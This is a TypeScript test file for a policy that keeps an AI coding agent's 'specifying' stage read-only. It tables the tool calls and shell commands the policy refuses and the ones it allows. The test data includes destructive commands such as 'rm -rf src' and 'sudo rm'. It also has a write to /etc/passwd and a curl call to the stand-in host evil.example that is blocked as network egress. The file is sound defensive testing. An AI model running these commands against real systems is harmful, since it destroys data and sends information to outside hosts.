/**
 * The read-only stage as a table (docs/board.md B4, B6; LOB-74).
 *
 * `decideStageCall` is pure, so what a specifying run may and may not do is a row here: no harness,
 * no database, no model. `policy.hook.test.ts` proves the rule is selected at `openSession` and
 * delivered into a real transcript, and `.pi/skills/verify-policy`'s `stage` case proves it through
 * the session API on a real card in each column.
 *
 * The allow rows matter as much as the refusals: a specifying run reads the code, and a rule that
 * refused `grep … 2>/dev/null` or `git log` would leave the stage with nothing it can do.
 */
import type { JsonObject, ToolCall } from "@earendil-works/pi-ai";
import { Effect } from "effect";
import { describe, expect, it } from "vitest";
import {
  autonomyPolicy,
  decideStageCall,
  DEFAULT_AUTONOMY,
  READ_ONLY_ROLES,
  readOnlyStageOf,
  readOnlyStagePolicy,
  type PolicyDecision,
  type ReadOnlyStage,
} from "./policy";

const call = (name: string, args: JsonObject): ToolCall => ({
  type: "toolCall",
  id: "call-1",
  name,
  arguments: args,
});

const bash = (command: string): ToolCall => call("bash", { command });

/** The default pipeline's specifying column, as `readOnlyStageOf` resolves it. */
const SPECIFYING: ReadOnlyStage = {
  stage: "specifying",
  column: "specifying",
  role: "specifier",
};

const refusalOf = (toolCall: ToolCall, stage = SPECIFYING) => {
  const decision = decideStageCall(stage, toolCall);
  if (decision._tag !== "block") {
    throw new Error(`expected a refusal for ${JSON.stringify(toolCall)}`);
  }
  return decision;
};

describe("which runs are a read-only stage", () => {
  it("is the specifier's column, named by the role rather than by the column", () => {
    expect(READ_ONLY_ROLES).toEqual({ specifier: "specifying" });
    expect(
      readOnlyStageOf({ column: "specifying", role: "specifier" }),
    ).toEqual(SPECIFYING);
    // A board that calls the column something else is still the specifying stage.
    expect(readOnlyStageOf({ column: "scoping", role: "specifier" })).toEqual({
      stage: "specifying",
      column: "scoping",
      role: "specifier",
    });
  });

  it.each([
    ["a building run", { column: "building", role: "builder" }],
    ["a reviewing run", { column: "review", role: "reviewer" }],
    ["a column that declares no role", { column: "specifying" }],
    ["a role with no column", { role: "specifier" }],
    ["a session with no card", undefined],
  ])("is not %s", (_label, run) => {
    expect(readOnlyStageOf(run)).toBeUndefined();
  });
});

describe("a read-only stage refuses what writes", () => {
  it.each([
    [
      "the write tool",
      call("write", { path: "SPEC.md", content: "x" }),
      "write SPEC.md",
    ],
    [
      "the edit tool",
      call("edit", { path: "src/a.ts", edits: [] }),
      "edit src/a.ts",
    ],
    ["the verify tool", call("verify", {}), "verify"],
    ["a redirect", bash("echo x > notes.md"), "redirecting output to notes.md"],
    ["an append", bash("echo x >> notes.md"), "redirecting output to notes.md"],
    ["a write-table command", bash("touch notes.md"), "touch writing notes.md"],
    ["a removal", bash("rm -rf src"), "rm writing src"],
    ["a copy", bash("cp a.txt b.txt"), "cp writing b.txt"],
    ["tee into a file", bash("echo x | tee notes.md"), "tee writing notes.md"],
    ["dd into a file", bash("dd if=/dev/zero of=disk.img"), "dd of=disk.img"],
    ["a commit", bash("git commit -am wip"), "git commit"],
    ["a push", bash("git push origin refs/heads/factory/ses_1"), "git push"],
    ["a checkout", bash("git -C . checkout -b x"), "git checkout"],
    ["a stash", bash("git stash"), "git stash"],
    [
      "a write after a read",
      bash("ls && echo x > out.txt"),
      "redirecting output to out.txt",
    ],
    [
      "a write inside sh -c",
      bash("sh -c 'echo x > out.txt'"),
      "redirecting output to out.txt",
    ],
    [
      "a write behind a wrapper",
      bash("sudo rm notes.md"),
      "rm writing notes.md",
    ],
  ])("refuses %s", (_label, toolCall, what) => {
    const decision = refusalOf(toolCall);
    expect(decision.refusal).toEqual({
      _tag: "ReadOnlyStage",
      stage: "specifying",
      column: "specifying",
      role: "specifier",
      call: toolCall.name,
      what,
    });
  });

  it("names the stage, the column and the role, not just that it refused", () => {
    const { reason } = refusalOf(
      call("write", { path: "SPEC.md", content: "x" }),
      {
        stage: "specifying",
        column: "scoping",
        role: "specifier",
      },
    );
    expect(reason).toBe(
      'write SPEC.md is refused: this run is in the read-only specifying stage (column "scoping", role specifier), which reads the workspace and changes nothing in it. Read and search instead, and put what you found in your answer or ask a question with the ask tool.',
    );
  });
});

describe("a read-only stage leaves reading alone", () => {
  it.each([
    ["the read tool", call("read", { path: "src/a.ts" })],
    ["the ask tool", call("ask", { question: "which repo?" })],
    ["a tool the rule has never heard of", call("spec", { goal: "x" })],
    ["a listing", bash("ls -la")],
    ["a search with its errors discarded", bash("grep -rn foo . 2>/dev/null")],
    ["a pipeline of readers", bash("git log --oneline | head -20")],
    ["a diff", bash("git diff main...HEAD --stat")],
    ["the stash list", bash("git stash list")],
    ["tee with no file", bash("echo x | tee")],
    ["a write to a device", bash("echo x | tee /dev/null")],
    ["dd to stdout", bash("dd if=a.bin of=/dev/stdout")],
    ["an echo that mentions a write", bash("echo 'rm -rf src'")],
    ["a bash call with no command", call("bash", {})],
  ])("allows %s", (_label, toolCall) => {
    expect(decideStageCall(SPECIFYING, toolCall)).toEqual({ _tag: "allow" });
  });
});

describe("the stage composed into a session's policy", () => {
  const decide = (
    toolCall: ToolCall,
    approvalRequired: readonly string[] = [],
  ): PolicyDecision =>
    Effect.runSync(
      readOnlyStagePolicy(
        autonomyPolicy(
          { ...DEFAULT_AUTONOMY, approvalRequired },
          "/work/ses_1",
          "ses_1",
        ),
        SPECIFYING,
      ).decide(toolCall),
    );

  it("words a write outside the worktree as the stage's, which is the refusal the run can act on", () => {
    const decision = decide(
      call("write", { path: "/etc/passwd", content: "x" }),
    );
    expect(decision._tag).toBe("block");
    if (decision._tag !== "block") return;
    expect(decision.reason).toContain("read-only specifying stage");
    expect(decision.reason).not.toContain("Write inside the worktree");
  });

  it("still refuses what D11 refuses when the stage allows it", () => {
    const decision = decide(bash("curl https://evil.example/x"));
    expect(decision).toMatchObject({ _tag: "block" });
    if (decision._tag !== "block") return;
    expect(decision.reason).toContain("network egress to evil.example");
    expect(decision.refusal).toBeUndefined();
  });

  it("still asks for a gated call the stage allows, and never for one it refuses", () => {
    expect(
      decide(bash("npm publish --dry-run"), ["npm publish"]),
    ).toMatchObject({ _tag: "ask", action: "npm publish" });
    expect(
      decide(bash("npm publish > out.txt"), ["npm publish"]),
    ).toMatchObject({
      _tag: "block",
      refusal: { _tag: "ReadOnlyStage", what: "redirecting output to out.txt" },
    });
  });

  it("keeps the wrapped policy's rules, because the narrowing lives in decide", () => {
    const wrapped = autonomyPolicy(DEFAULT_AUTONOMY, "/work/ses_1");
    expect(readOnlyStagePolicy(wrapped, SPECIFYING).rules).toBe(wrapped.rules);
  });
});
